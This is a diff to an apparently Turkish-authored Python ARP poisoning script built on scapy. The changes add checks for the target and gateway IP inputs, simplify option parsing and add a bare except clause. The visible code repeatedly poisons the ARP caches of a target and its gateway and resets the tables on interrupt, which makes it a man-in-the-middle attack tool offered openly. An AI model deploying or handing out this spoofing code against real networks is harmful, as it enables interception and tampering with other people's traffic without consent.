@@ -9,7 +9,12 @@ def user_input():
     parse = optparse.OptionParser()
     parse.add_option("-t","--target",dest="target_ip",help="enter target ip")
     parse.add_option("-g","--gateway",dest="poisoning_ip",help="enter poisoning ip")
-    return parse.parse_args()
+    input = parse.parse_args()[0]
+    if not (input.target_ip):
+        print("enter target ip")
+    if not (input.poisoning_ip):
+        print("enter gateway ip")
+    return input
 
 def get_mac_address(target_ip):
     arp = scapy.ARP(pdst=target_ip)
@@ -30,7 +35,7 @@ def reset_operation(target_ip,poisoning_ip):
     scapy.send(arp,verbose=False,count=7)
 
 sayac = 0
-(input,arguments) = user_input()
+input = user_input()
 try:
     while(True):
         arp_poisoning(input.target_ip,input.poisoning_ip)
@@ -43,3 +48,5 @@ except(KeyboardInterrupt):
     reset_operation(input.target_ip,input.poisoning_ip)
     reset_operation(input.poisoning_ip,input.target_ip)
     print("\narp tablosu resetlendi\n")
+except:
+    print()
